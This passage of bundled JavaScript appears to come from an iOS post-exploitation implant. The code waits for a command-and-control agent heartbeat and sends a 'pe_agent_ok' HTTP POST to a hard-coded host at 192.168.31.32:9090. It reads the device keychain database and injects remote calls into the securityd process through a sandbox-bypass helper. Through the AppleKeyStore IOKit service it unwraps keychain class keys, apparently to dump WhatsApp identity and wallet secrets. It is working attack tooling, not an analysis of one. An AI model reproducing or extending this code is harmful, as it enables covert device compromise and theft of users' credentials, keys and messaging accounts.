				LOG("[PE-WORKER] c2_agent async fire OK; wait /tmp/c2_ipc/agent.hb then destroy RC");
				globalThis.__pe_cold_stub_ts = Date.now();
				globalThis.__pe_last_bs_reinject_ts = Date.now();
				globalThis.__pe_last_list_ensure_ts = Date.now();
				try {
					if (!globalThis.__pe_task_modules) globalThis.__pe_task_modules = {};
					globalThis.__pe_task_modules["c2_agent"] = {
						id: "c2_agent",
						kind: "agent",
						status: "starting",
						apply_ts: Date.now(),
						start_ts: Date.now(),
						auth: "n/a",
						note: "cold_async",
						timeout_ms: 20000
					};
				} catch (_) {}
				let hbOk = false;
				let waitMs = 90000;
				let tWait = Date.now();
				let enteredLogged = false;
				function peAgentEnteredSeen() {
					let Nloc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
					let paths = ["/tmp/c2_ipc/agent.entered", "/var/tmp/c2_ipc/agent.entered"];
					for (let pi = 0; pi < paths.length; pi++) {
						try {
							let fd = Number(Nloc.callSymbol("open", paths[pi], 0));
							if (!(fd >= 0)) continue;
							let buf = Nloc.callSymbol("malloc", 256);
							let n = Number(Nloc.callSymbol("read", fd, buf, 240));
							Nloc.callSymbol("close", fd);
							let s = "";
							try { if (n > 0 && buf) s = Nloc.readString(buf); } catch (_) {}
							try { Nloc.callSymbol("free", buf); } catch (_) {}
							if (s && s.indexOf("early") >= 0) return true;
						} catch (_) {}
					}
					return false;
				}
				while ((Date.now() - tWait) < waitMs) {
					if (!enteredLogged && peAgentEnteredSeen()) {
						enteredLogged = true;
						LOG("[PE-WORKER] agent.entered seen elapsed_ms=" + (Date.now() - tWait) + " - early init OK, waiting hb");
					}
					if (peAgentHbFresh(45000)) { hbOk = true; break; }
					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
				}
				if (hbOk) {
					LOG("[PE-WORKER] agent.hb live elapsed_ms=" + (Date.now() - tWait) + " - settle 3s then destroy RC");

					// LAB: pe_agent_ok after agent.hb
					try {
						let _fd2 = fcall(func_resolve("socket"), 2n, 1n, 0n);
						if (_fd2 >= 0n) {
							let _sa2 = fcall(func_resolve("calloc"), 1n, 16n);
							uwrite64(_sa2, 0x0200a8c09a1f0210n);
							if (fcall(func_resolve("connect"), _fd2, _sa2, 16n) == 0n) {
								let _b2 = "{\"msg\":\"pe_agent_ok\"}";
								let _r2 = "POST /pelog HTTP/1.0\r\nHost: 192.168.31.32:9090\r\nContent-Type: application/json\r\nContent-Length: " + _b2.length + "\r\n\r\n" + _b2;
								fcall(func_resolve("write"), _fd2, get_cstring(_r2), BigInt(_r2.length));
								LOG("[PE] PELOG pe_agent_ok sent");
							}
							fcall(func_resolve("close"), _fd2);
						}
					} catch (_aPe) {
						try { LOG("[PE] PELOG agent ping err " + _aPe); } catch (_e3) {}
					}
					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 3000000);
					try {
						if (globalThis.__pe_task_modules && globalThis.__pe_task_modules["c2_agent"])
							globalThis.__pe_task_modules["c2_agent"].status = "running";
					} catch (_) {}
				} else {
					LOG("[PE-WORKER] agent.hb TIMEOUT " + waitMs + "ms entered=" + enteredLogged +
						" - destroy RC; allow listen reinject");
					// Allow peEnsureBs / reinject_bs to try again with freshly baked agent.
					try { globalThis.__pe_sb_agent_cold = false; } catch (_) {}
				}
				try { agentInj.destroy(); } catch (dE) {
					LOG("[PE-WORKER] agent RC destroy warn: " + dE);
				}
				LOG("[PE-WORKER] SB RC destroyed hb=" + hbOk);
			}
		} catch (agentErr) {
			LOG("[PE-WORKER] c2_agent inject error: " + agentErr);
		}
		LOG("[PE-WORKER] settle 2s before pe listen loop");
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 2000000);
	}

	// ===== P7 Phase 2: PRE -> [4a] AKS classkeys+blob3 -> destroy securityd -> [4b] dump =====
	// Cold: p7_enableP7=false. Hot: p7_warmup (keychain_copier, no pe_dbg).
	// REQUIRES_P7: session_whatsapp / pe_wa_collect / assemble identity / keychain dump.
	if (!globalThis.__pe_p7_state) {
		globalThis.__pe_p7_state = {
			ready: false,
			running: false,
			wa_identity: false,
			dump: false,
			classkeys: false,
			source: "",
			err: "",
			ts: 0,
			rc_attempted: false,
			rc_ok: false,
			phase: ""
		};
	}
	// PRE: keychain DB + collect metakey unwrap jobs. NEVER opens securityd RC.
	globalThis.__peP7Precollect = function (opts) {
		opts = opts || {};
		let force = !!opts.force;
		if (globalThis.__pe_p7_pre && globalThis.__pe_p7_pre.ok && !force) {
			LOG("[P7] PRE reuse jobs=" + globalThis.__pe_p7_pre.jobs.length +
				" classes=" + Object.keys(globalThis.__pe_p7_pre.classes || {}).length);
			return globalThis.__pe_p7_pre;
		}
		LOG("[P7] PRE begin - collect unwrap jobs (no securityd RC)");
		let N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
		let out = {
			ok: false,
			jobs: [],
			classes: {},
			db_path: "",
			peek_rows: 0,
			err: "",
			ts: Date.now()
		};
		try {
			let dbPath1 = "/tmp/keychain-2.db";
			let dbPath2 = "/var/Keychains/keychain-2.db";
			let dbPath = "";
			try {
				let tfd = Number(N.callSymbol("open", dbPath1, 0));
				if (tfd >= 0) { N.callSymbol("close", tfd); dbPath = dbPath1; }
			} catch (_) {}
			if (!dbPath) {
				try {
					let tfd2 = Number(N.callSymbol("open", dbPath2, 0));
					if (tfd2 >= 0) { N.callSymbol("close", tfd2); dbPath = dbPath2; }
				} catch (_) {}
			}
			if (!dbPath) {
				out.err = "no_keychain_db";
				LOG("[P7] PRE FAIL no_keychain_db - refuse securityd RC");
				globalThis.__pe_p7_pre = out;
				return out;
			}
			out.db_path = dbPath;
			let SQLITE_OK = 0, SQLITE_ROW = 100;
			let dbPtrBuf = N.callSymbol("calloc", 1, 8);
			let dbRc = Number(N.callSymbol("sqlite3_open_v2", dbPath, dbPtrBuf, 0x01, 0n));
			if (dbRc !== SQLITE_OK) {
				try { N.callSymbol("free", dbPtrBuf); } catch (_) {}
				out.err = "sqlite_open_rc=" + dbRc;
				LOG("[P7] PRE FAIL " + out.err + " path=" + dbPath);
				globalThis.__pe_p7_pre = out;
				return out;
			}
			let db = N.read64(BigInt(dbPtrBuf));
			N.callSymbol("free", dbPtrBuf);
			N.callSymbol("sqlite3_busy_timeout", db, 5000);
			LOG("[P7] PRE DB open OK path=" + dbPath);

			function peekProtClass(blobU8) {
				if (!blobU8 || blobU8.length < 8) return 0;
				let ver = blobU8[0] | (blobU8[1] << 8) | (blobU8[2] << 16) | (blobU8[3] << 24);
				let i = (ver >= 7 && ver <= 20) ? 4 : 0;
				let end = blobU8.length;
				while (i < end) {
					let tag = 0, shift = 0, b;
					do {
						if (i >= end) return 0;
						b = blobU8[i++];
						tag |= (b & 0x7f) << shift;
						shift += 7;
					} while (b & 0x80);
					let fn = tag >> 3, wt = tag & 7;
					if (fn === 3 && wt === 0) {
						let v = 0; shift = 0;
						do {
							if (i >= end) return 0;
							b = blobU8[i++];
							v |= (b & 0x7f) << shift;
							shift += 7;
						} while (b & 0x80);
						return v >>> 0;
					}
					if (wt === 0) {
						do { if (i >= end) return 0; b = blobU8[i++]; } while (b & 0x80);
					} else if (wt === 2) {
						let ln = 0; shift = 0;
						do {
							if (i >= end) return 0;
							b = blobU8[i++];
							ln |= (b & 0x7f) << shift;
							shift += 7;
						} while (b & 0x80);
						i += ln;
					} else if (wt === 5) i += 4;
					else if (wt === 1) i += 8;
					else break;
				}
				return 0;
			}

			let needed = null;
			if (p7_agrpFilter) {
				needed = {};
				let needN = 0;
				let peekBuf = BigInt(N.callSymbol("calloc", 1, 8));
				let peekLim = peP7MaxRows();
				let peekSql = "SELECT rowid, data, agrp FROM genp" + peP7AgrpSqlWhere() + " LIMIT " + peekLim;
				let peekRc = Number(N.callSymbol("sqlite3_prepare_v2", db, peekSql, -1, peekBuf, 0n));
				if (peekRc === SQLITE_OK) {
					let peekStmt = N.read64(peekBuf);
					while (Number(N.callSymbol("sqlite3_step", peekStmt)) === SQLITE_ROW) {
						out.peek_rows++;
						let agrpPeek = "";
						try {
							let ap = N.callSymbol("sqlite3_column_text", peekStmt, 2);
							if (ap) agrpPeek = N.readString(ap) || "";
						} catch (_) {}
						if (out.peek_rows <= 24 && agrpPeek)
							LOG("[P7] PRE peek agrp=" + String(agrpPeek).slice(0, 80));
						let pb = BigInt(N.callSymbol("sqlite3_column_blob", peekStmt, 1));
						let plen = Number(N.callSymbol("sqlite3_column_bytes", peekStmt, 1));
						if (!pb || pb === 0n || plen < 8 || plen > 65536) continue;
						let u8 = new Uint8Array(N.read(pb, plen));
						let pc = peekProtClass(u8);
						if (pc > 0 && !needed[pc]) {
							needed[pc] = 1;
							needN++;
							LOG("[P7] PRE need class=" + pc + " (row " + out.peek_rows + ")");
						}
					}
					N.callSymbol("sqlite3_finalize", peekStmt);
					LOG("[P7] PRE peek rows=" + out.peek_rows + " classes=" + needN);
				} else {
					LOG("[P7] PRE peek FAILED rc=" + peekRc + " - collect ALL metakeys");
					needed = null;
				}
				N.callSymbol("free", peekBuf);
			}
			out.classes = needed || {};

			let mkBuf = BigInt(N.callSymbol("calloc", 1, 8));
			let mkSql = "SELECT keyclass, data FROM metadatakeys";
			let mkRc = Number(N.callSymbol("sqlite3_prepare_v2", db, mkSql, -1, mkBuf, 0n));
			if (mkRc === SQLITE_OK) {
				let mkStmt = N.read64(mkBuf);
				while (Number(N.callSymbol("sqlite3_step", mkStmt)) === SQLITE_ROW) {
					let kc = Number(N.callSymbol("sqlite3_column_int", mkStmt, 0));
					if (needed && !needed[kc]) continue;
					let wp = BigInt(N.callSymbol("sqlite3_column_blob", mkStmt, 1));
					let wl = Number(N.callSymbol("sqlite3_column_bytes", mkStmt, 1));
					if (!wp || wp === 0n || wl < 40) continue;
					let wrap = new Uint8Array(N.read(wp, wl));
					out.jobs.push({ kc: kc, wrap: wrap, wrapLen: wl });
				}
				N.callSymbol("sqlite3_finalize", mkStmt);
			} else {
				out.err = "metadatakeys_prepare_rc=" + mkRc;
			}
			N.callSymbol("free", mkBuf);
			N.callSymbol("sqlite3_close", db);

			out.ok = out.jobs.length > 0;
			if (!out.ok && !out.err) out.err = "no_unwrap_jobs";
			LOG("[P7] PRE done ok=" + out.ok + " jobs=" + out.jobs.length +
				" err=" + (out.err || "") + " - RC may fire only if ok");
		} catch (pe) {
			out.err = String(pe).slice(0, 120);
			out.ok = false;
			LOG("[P7] PRE THREW: " + out.err);
		}
		globalThis.__pe_p7_pre = out;
		return out;
	};
	globalThis.__peP7Phase2 = function (reason) {
		reason = reason || "manual";
		let st = globalThis.__pe_p7_state;
		if (st.running) return { ok: false, error: "busy", state: st };
		if (st.ready && reason !== "force") {
			return { ok: true, reused: true, wa_identity: !!st.wa_identity, dump: !!st.dump, classkeys: !!st.classkeys, source: st.source || "", state: st };
		}
		try {
			let dumpOnDisk = typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk();
			let waOnDisk = typeof peP7IdentityOnDisk === "function" && peP7IdentityOnDisk();
			if (reason !== "force" && dumpOnDisk && waOnDisk) {
				st.dump = true;
				st.wa_identity = true;
				st.classkeys = !!(st.classkeys || (typeof peP7ClassKeysOnDisk === "function" && peP7ClassKeysOnDisk()));
				st.ready = true;
				LOG("[P7] dump+wa_identity on disk - skip securityd RC");
				return {
					ok: true,
					reused: true,
					skipped: "dump_and_wa_done",
					wa_identity: true,
					dump: true,
					classkeys: !!st.classkeys,
					source: st.source || "",
					state: st
				};
			}
		} catch (_) {}
		// Same pe lifetime: allow queue-driven re-entry after long cooldown.
		// Hard refuse only when securityd queue is exhausted (or no queue + already attempted).
		if (st.rc_attempted && !(st.wa_identity && st.dump) && reason !== "force" && reason.indexOf("queue") !== 0) {
			let sq = globalThis.__pe_sec_q;
			if (sq && sq.state === "exhausted") {
				st.err = "rc_queue_exhausted_need_cold";
				LOG("[P7] Phase2 refuse source=" + reason + " - sec RC queue exhausted; cold required");
				return {
					ok: false,
					error: st.err,
					hint: "cold_boot_pe_then_single_p7_warmup",
					wa_identity: false,
					source: st.source || "",
					state: st
				};
			}
			if (!sq || !sq.allow_reentry) {
				st.err = "rc_already_attempted_need_cold";
				LOG("[P7] Phase2 refuse source=" + reason + " - RC already attempted this pe; cold required");
				return {
					ok: false,
					error: st.err,
					hint: "cold_boot_pe_then_single_p7_warmup",
					wa_identity: false,
					source: st.source || "",
					state: st
				};
			}
		}
		// queue_retry / force: clear one-shot latch so Phase2 may open securityd again
		if ((reason === "force" || reason.indexOf("queue") === 0) && st.rc_attempted && !(st.wa_identity && st.dump)) {
			LOG("[P7] Phase2 re-entry allowed source=" + reason + " (sec queue / force)");
			st.rc_attempted = false;
			st.rc_ok = false;
			st.err = "";
		}
		st.running = true;
		st.source = String(reason);
		st.err = "";
		st.phase = "pre";
		LOG("[P7] Phase2 begin source=" + st.source + " (PRE->RC->POST)");
		// PRE first - never open securityd without unwrap jobs.
		let pre = null;
		try {
			let reusePre = !!(globalThis.__pe_p7_pre && globalThis.__pe_p7_pre.ok &&
				reason.indexOf("queue") === 0);
			pre = reusePre ? globalThis.__pe_p7_pre : globalThis.__peP7Precollect({ force: !reusePre });
		} catch (preE) {
			pre = { ok: false, err: String(preE).slice(0, 80), jobs: [] };
		}
		if (!pre || !pre.ok || !(pre.jobs && pre.jobs.length)) {
			st.err = (pre && pre.err) || "precollect_fail";
			st.phase = "pre_fail";
			st.running = false;
			st.ts = Date.now();
			LOG("[P7] PRE gate FAIL err=" + st.err + " - skip securityd RC");
			try {
				peP7CacheSave({
					done: true, started: true, ok: false, wa_identity: false,
					error: st.err, phase: "pre", source: st.source || "",
					rc_attempted: false, rc_ok: false
				});
			} catch (_) {}
			return {
				ok: false,
				error: st.err,
				phase: "pre",
				wa_identity: false,
				source: st.source,
				state: st
			};
		}
		st.phase = "rc";
		LOG("[P7] RC begin - securityd batch jobs=" + pre.jobs.length);
		try {
			// Heartbeat for bootstrap wait-extend (hot p7_warmup only; cold path also harmless)
			try {
				let _N0 = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
				let _pb = JSON.stringify({
					running: true,
					phase: "phase2",
					source: st.source,
					ts: Date.now()
				}) + "\n";
				let _pfd = Number(_N0.callSymbol("open", "/tmp/c2_ipc/pe.p7.progress", 0x601, 0x1FF));
				if (_pfd >= 0) {
					let _pbuf = BigInt(_N0.callSymbol("malloc", BigInt(_pb.length + 1)));
					_N0.writeString(_pbuf, _pb);
					_N0.callSymbol("write", _pfd, _pbuf, _pb.length);
					_N0.callSymbol("close", _pfd);
					_N0.callSymbol("free", _pbuf);
				}
			} catch (_peProgErr) {}
			let p7_secRC = null;
			try {
				p7_flog("=== Phase 2: V4 AKS Oracle Pipeline ===");
			let N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];

				function p7_toPtr(v) {
					if (typeof v === 'bigint') return v;
					if (typeof v === 'number') return BigInt(v);
					if (v === null || v === undefined) return 0n;
					p7_flog("WARN toPtr: type=" + typeof v + " v=" + String(v).slice(0, 40));
					return 0n;
				}
				function p7_toRC(v) {
					if (typeof v === 'number') return v;
					if (typeof v === 'bigint') return Number(v & 0xFFFFFFFFn);
					if (v === null || v === undefined) return -1;
					p7_flog("WARN toRC: type=" + typeof v + " v=" + String(v).slice(0, 40));
					return -1;
				}

				function p7_requirePtr(label, v) {
					if (typeof v === 'bigint') return v;
					if (typeof v === 'number') return BigInt(v);
					p7_flog("BUG requirePtr(" + label + "): got " + typeof v);
					throw new TypeError("requirePtr(" + label + "): expected bigint|number, got " + typeof v);
				}

				// --- Poke + RC(securityd): ONE attempt per SEC-Q fire (old_pe style) ---
				// Multi-unwrap happens AFTER RC is up (local sqlite blobs -> aksUnwrap batch).
				// Retries are owned by SEC-Q (5s?N), not by try1+long-settle+try2 here.
				function p7_pokeSecurityd() {
					p7_flog("Poke: waking securityd...");
					try {
						var p7_rpResult = p7_toPtr(N.callSymbol("malloc", 8n));
						if (p7_rpResult && p7_rpResult !== 0n) {
							var p7_rpKSC = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecClass")));
							var p7_rpKGP = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecClassGenericPassword")));
							var p7_rpKML = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecMatchLimit")));
							var p7_rpKM1 = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecMatchLimitOne")));
							for (var pi = 0; pi < 3; pi++) {
								var pq = p7_toPtr(N.callSymbol("CFDictionaryCreateMutable", 0n, 2n, 0n, 0n));
								if (!pq || pq === 0n) break;
								N.callSymbol("CFDictionarySetValue", pq, p7_rpKSC, p7_rpKGP);
								N.callSymbol("CFDictionarySetValue", pq, p7_rpKML, p7_rpKM1);
								N.write64(p7_rpResult, 0n);
								var pr = Number(N.callSymbol("SecItemCopyMatching", pq, p7_rpResult));
								var pref = N.readPtr(p7_rpResult);
								if (pref && pref !== 0n) N.callSymbol("CFRelease", pref);
								N.callSymbol("CFRelease", pq);
								p7_flog("poke[" + pi + "] ret=" + pr);
							}
							N.callSymbol("free", p7_rpResult);
						}
						p7_flog("Poke done");
					} catch (pokeErr) {
						p7_flog("Poke error: " + pokeErr);
					}
				}
				function p7_openSecuritydRC(label) {
					p7_flushLog();
					var p7_t0 = Date.now();
					p7_flog("RC: creating securityd (" + label + ")...");
					var rc = null;
					try {
						rc = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("securityd", migFilterBypass, { once: true });
						p7_flog("RC: constructor took " + (Date.now() - p7_t0) + "ms success=" + (rc && rc.success ? rc.success() : false) + " once=1");
					} catch (rcErr) {
						p7_flog("RC constructor threw after " + (Date.now() - p7_t0) + "ms: " + String(rcErr));
						rc = null;
					}
					if (!rc || !rc.success()) {
						p7_flog("RC(securityd) " + label + " FAILED success=false");
						if (rc) { try { rc.destroy(); } catch (e) {} }
						return null;
					}
					var pid = 0, uid = -1;
					try {
						pid = p7_toRC(rc.call(3000, "getpid"));
						uid = p7_toRC(rc.call(3000, "getuid"));
					} catch (pidErr) {
						p7_flog("RC getpid threw: " + String(pidErr).slice(0, 80));
						try { rc.destroy(); } catch (e) {}
						return null;
					}
					p7_flog("RC(securityd) " + label + " pid=" + pid + " uid=" + uid);
					if (!Number(pid)) {
						p7_flog("RC(securityd) " + label + " ABORT pid=0");
						try { rc.destroy(); } catch (e) {}
						return null;
					}
					return { rc: rc, pid: pid, uid: uid };
				}

				st.rc_attempted = true;
				p7_pokeSecurityd();
				var p7_opened = p7_openSecuritydRC("once");
				if (!p7_opened) {
					st.rc_ok = false;
					st.err = "rc_securityd_failed";
					st.phase = "rc_fail";
					p7_flog("RC(securityd) FAILED (single attempt; SEC-Q may retry)");
					p7_secRC = null;
			} else {
					st.rc_ok = true;
					st.phase = "rc";
					p7_secRC = p7_opened.rc;
					let p7_remotePid = p7_opened.pid;
					let p7_remoteUid = p7_opened.uid;
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(p7_secRC);
					p7_flushLog();

					let p7_rm = p7_secRC.mem();
					let p7_sp = p7_secRC.lastLiveSP();
					p7_flog("RC mem=0x" + p7_rm.toString(16) + " liveSP=0x" + p7_sp.toString(16));

					// --- 2B: Remote AKS IOKit init ---
					function p7_rcDlsym(name) {
						p7_secRC.writeStr(p7_rm, name);
						return p7_toPtr(p7_secRC.call(3000, "dlsym", 0xfffffffffffffffen, p7_rm));
					}

					function p7_rcCallN(funcName, x0, x1, x2, x3, x4, x5, x6, x7, stackArgs) {
						let sp = p7_secRC.lastLiveSP();
						if (!sp) { p7_flog("callN: no live SP!"); return 0n; }
						if (stackArgs) {
							for (var si = 0; si < stackArgs.length; si++)
								p7_secRC.write64(sp + BigInt(si * 8), stackArgs[si] || 0n);
						}
						return p7_secRC.call(5000, funcName,
							x0 || 0n, x1 || 0n, x2 || 0n, x3 || 0n,
							x4 || 0n, x5 || 0n, x6 || 0n, x7 || 0n);
					}

					function p7_rcCalloc(size) {
						var raw = p7_secRC.call(3000, "calloc", 1n, BigInt(size));
						if (typeof raw !== 'bigint' && typeof raw !== 'number')
							p7_flog("rcCalloc(" + size + ") raw type=" + typeof raw + " val=" + String(raw).slice(0, 60));
						return p7_toPtr(raw);
					}
					function p7_rcFree(ptr) {
						if (ptr && ptr !== 0n) p7_secRC.call(1000, "free", p7_requirePtr("rcFree", ptr));
					}

					function p7_rcWriteBuf(remoteDst, buf, len) {
						p7_requirePtr("rcWriteBuf.dst", remoteDst);
						var tmp = BigInt(N.callSymbol("malloc", len));
						N.write(tmp, buf.buffer || buf);
						p7_secRC.write(remoteDst, tmp, len);
						N.callSymbol("free", tmp);
					}
					function p7_rcReadBuf(remoteSrc, len) {
						p7_requirePtr("rcReadBuf.src", remoteSrc);
						var tmp = BigInt(N.callSymbol("malloc", len));
						p7_secRC.read(remoteSrc, tmp, len);
						var data = N.read(tmp, len);
						N.callSymbol("free", tmp);
						return data;
					}

					var p7_aksConn = 0n;
					var p7_aksReady = false;
					var p7_result = {
						timestamp: new Date().toISOString(),
						source: "pe_worker_v4",
						securityd_pid: p7_remotePid,
						securityd_uid: p7_remoteUid,
						diagnostics: {},
						metadataKeys: {},
						tables: {},
						wallets: {},
						errors: []
					};

					// Resolve IOKit symbols in securityd
					var p7_symIOSM = p7_rcDlsym("IOServiceMatching");
					var p7_symIOSGMS = p7_rcDlsym("IOServiceGetMatchingService");
					var p7_symIOSO = p7_rcDlsym("IOServiceOpen");
					var p7_symIOOR = p7_rcDlsym("IOObjectRelease");
					var p7_symIOCCM = p7_rcDlsym("IOConnectCallMethod");
					p7_flog("IOKit syms: Matching=0x" + p7_symIOSM.toString(16) +
						" GetMatching=0x" + p7_symIOSGMS.toString(16) +
						" Open=0x" + p7_symIOSO.toString(16) +
						" CallMethod=0x" + p7_symIOCCM.toString(16));

					if (p7_symIOSM && p7_symIOSGMS && p7_symIOSO && p7_symIOCCM) {
						// task_self_trap in securityd
						var p7_secTaskSelf = p7_toPtr(p7_secRC.call(3000, "task_self_trap"));
						p7_flog("securityd task_self=0x" + p7_secTaskSelf.toString(16));

						// IOServiceMatching("AppleKeyStore")
						p7_secRC.writeStr(p7_rm, "AppleKeyStore");
						var p7_matching = p7_toPtr(p7_secRC.call(3000, "IOServiceMatching", p7_rm));
						p7_flog("IOServiceMatching=0x" + p7_matching.toString(16));

						if (p7_matching && p7_matching !== 0n) {
							// IOServiceGetMatchingService(kIOMasterPortDefault, matching)
							var p7_service32 = p7_toRC(p7_secRC.call(3000, "IOServiceGetMatchingService", 0n, p7_matching)) & 0xFFFFFFFF;
							p7_flog("IOServiceGetMatchingService=" + p7_service32);

							if (p7_service32 > 0) {
								// IOServiceOpen(service, taskSelf, 0, &connSlot)
								var p7_connSlot = p7_rcCalloc(8);
								p7_secRC.write64(p7_connSlot, 0n);
								var p7_kr = p7_toRC(p7_secRC.call(3000, "IOServiceOpen",
									BigInt(p7_service32), p7_secTaskSelf, 0n, p7_connSlot));
								p7_flog("IOServiceOpen kr=0x" + (p7_kr >>> 0).toString(16));
								p7_secRC.call(1000, "IOObjectRelease", BigInt(p7_service32));

								if (p7_kr === 0) {
									p7_aksConn = p7_secRC.read64(p7_connSlot) & 0xFFFFFFFFn;
									p7_flog("AKS conn=0x" + p7_aksConn.toString(16));

									// IOConnectCallMethod(conn, 0, ...) init handshake
									var p7_initOut = p7_rcCalloc(32);
									var p7_initOutCnt = p7_rcCalloc(8);
									p7_secRC.write64(p7_initOutCnt, 2n);
									var p7_initKr = p7_rcCallN("IOConnectCallMethod",
										p7_aksConn, 0n, 0n, 0n, 0n, 0n,
										p7_initOut, p7_initOutCnt,
										[0n, 0n]);
									var p7_initKrN = p7_toRC(p7_initKr);
									p7_flog("AKS init kr=0x" + (p7_initKrN >>> 0).toString(16));
									p7_rcFree(p7_initOut);
									p7_rcFree(p7_initOutCnt);

									if (p7_initKrN === 0) {
										p7_aksReady = true;
										p7_flog("AKS IOKit READY");
									} else {
										p7_flog("AKS init handshake failed, trying unwrap anyway");
										p7_aksReady = true;
									}
								}
								p7_rcFree(p7_connSlot);
							}
						}
					}
					p7_result.diagnostics.aksReady = p7_aksReady;
					p7_result.diagnostics.aksConn = "0x" + p7_aksConn.toString(16);
					p7_flushLog();

					// --- AKS unwrap helper (fail-fast when RC dies mid-pit) ---
					var p7_rcDead = false;
					var p7_rcDeadReason = "";
					function p7_markRcDead(why) {
						if (p7_rcDead) return;
						p7_rcDead = true;
						p7_rcDeadReason = String(why || "rc_dead").slice(0, 120);
						p7_flog("RC DEAD: " + p7_rcDeadReason + " - abort further AKS");
						p7_result.diagnostics.rcDead = true;
						p7_result.diagnostics.rcDeadReason = p7_rcDeadReason;
						p7_result.errors.push("rc_dead:" + p7_rcDeadReason);
					}
					function p7_aksUnwrap(keyclass, wrappedBuf, wrappedLen) {
						if (p7_rcDead) return null;
						if (!p7_aksReady || !p7_aksConn) return null;
						p7_flog("aksUnwrap: start class=" + keyclass + " len=" + wrappedLen);
						var scalarBuf, wrappedRemote, outBuf, outSizeBuf, kr, outSize;
						try {
							scalarBuf = p7_rcCalloc(16);
							p7_flog("aksUnwrap: scalar=0x" + scalarBuf.toString(16));
							p7_secRC.write64(scalarBuf, 0n);
							p7_secRC.write64(scalarBuf + 8n, BigInt(keyclass));
							p7_flog("aksUnwrap: scalars written");
							wrappedRemote = p7_rcCalloc(wrappedLen);
							p7_flog("aksUnwrap: wrapRem=0x" + wrappedRemote.toString(16));
							p7_rcWriteBuf(wrappedRemote, wrappedBuf, wrappedLen);
							p7_flog("aksUnwrap: wrapData written");
							outBuf = p7_rcCalloc(64);
							outSizeBuf = p7_rcCalloc(8);
							p7_secRC.write64(outSizeBuf, 32n);
							p7_flog("aksUnwrap: calling IOConnectCallMethod...");
							kr = p7_rcCallN("IOConnectCallMethod",
								p7_aksConn, 11n,
								scalarBuf, 2n,
								wrappedRemote, BigInt(wrappedLen),
								0n, 0n,
								[outBuf, outSizeBuf]);
							p7_flog("aksUnwrap: call returned, kr type=" + typeof kr);
							outSize = Number(p7_secRC.read64(outSizeBuf) & 0xFFFFn);
						} catch (innerErr) {
							var p7_ie = String(innerErr);
							p7_flog("aksUnwrap INNER error: " + p7_ie);
							if (p7_ie.indexOf("unable to find remote page") >= 0 ||
								p7_ie.indexOf("Don't receive") >= 0 ||
								p7_ie.indexOf("write() failed") >= 0 ||
								p7_ie.indexOf("BigInt") >= 0) {
								p7_markRcDead(p7_ie.slice(0, 100));
							}
							if (scalarBuf) try { p7_rcFree(scalarBuf); } catch (_) {}
							if (wrappedRemote) try { p7_rcFree(wrappedRemote); } catch (_) {}
							if (outBuf) try { p7_rcFree(outBuf); } catch (_) {}
							if (outSizeBuf) try { p7_rcFree(outSizeBuf); } catch (_) {}
							return null;
						}
						try { p7_rcFree(scalarBuf); } catch (_) {}
						try { p7_rcFree(wrappedRemote); } catch (_) {}
						var result = null;
						var krVal = p7_toRC(kr);
						p7_flog("AKS unwrap kr=" + krVal + " outSize=" + outSize);
						if (krVal === 0 && outSize > 0 && outSize <= 64) {
							try {
								result = p7_rcReadBuf(outBuf, outSize);
							} catch (rdErr) {
								p7_markRcDead("read:" + String(rdErr).slice(0, 80));
								result = null;
							}
						}
						try { p7_rcFree(outBuf); } catch (_) {}
						try { p7_rcFree(outSizeBuf); } catch (_) {}
						return { kr: krVal, outSize: outSize, data: result };
					}

					// --- 2C: Local SQLite3 pipeline ---
					var p7_SQLITE_OK = 0;
					var p7_SQLITE_ROW = 100;
					var p7_dbPath1 = "/tmp/keychain-2.db";
					var p7_dbPath2 = "/var/Keychains/keychain-2.db";

					p7_flog("--- Local SQLite3 pipeline ---");
					var p7_dbPtrBuf = N.callSymbol("calloc", 1, 8);
					var p7_dbRc = Number(N.callSymbol("sqlite3_open_v2", p7_dbPath1, p7_dbPtrBuf, 0x01, 0n));
					if (p7_dbRc !== p7_SQLITE_OK) {
						try {
							var p7_fd = Number(N.callSymbol("open", p7_dbPath1, 0));
							if (p7_fd >= 0) {
								p7_flog("DB1 exists ro fd=" + p7_fd + " path=" + p7_dbPath1);
								N.callSymbol("close", p7_fd);
							} else {
								p7_flog("DB1 missing/unreadable path=" + p7_dbPath1);
							}
						} catch (_) {}
						p7_flog("DB1 failed rc=" + p7_dbRc + ", trying fallback");
						p7_dbRc = Number(N.callSymbol("sqlite3_open_v2", p7_dbPath2, p7_dbPtrBuf, 0x01, 0n));
					}
					p7_flog("sqlite3_open rc=" + p7_dbRc);

					if (p7_dbRc === p7_SQLITE_OK) {
						var p7_db = N.read64(BigInt(p7_dbPtrBuf));
						N.callSymbol("free", p7_dbPtrBuf);
						N.callSymbol("sqlite3_busy_timeout", p7_db, 5000);
						p7_flog("DB opened OK, db=0x" + p7_db.toString(16));
						p7_flushLog();

						// --- WA-early: collect needed protClasses BEFORE full metakey pit ---
						// Full unwrap of every metadatakey kills RC mid-loop; WA only needs a few classes.
						var p7_neededClasses = null; // null = unwrap all; object map = WA-filtered
						function p7_peekProtClass(blobU8) {
							if (!blobU8 || blobU8.length < 8) return 0;
							var ver = blobU8[0] | (blobU8[1] << 8) | (blobU8[2] << 16) | (blobU8[3] << 24);
							var i = (ver >= 7 && ver <= 20) ? 4 : 0;
							var end = blobU8.length;
							while (i < end) {
								var tag = 0, shift = 0, b;
								do {
									if (i >= end) return 0;
									b = blobU8[i++];
									tag |= (b & 0x7f) << shift;
									shift += 7;
								} while (b & 0x80);
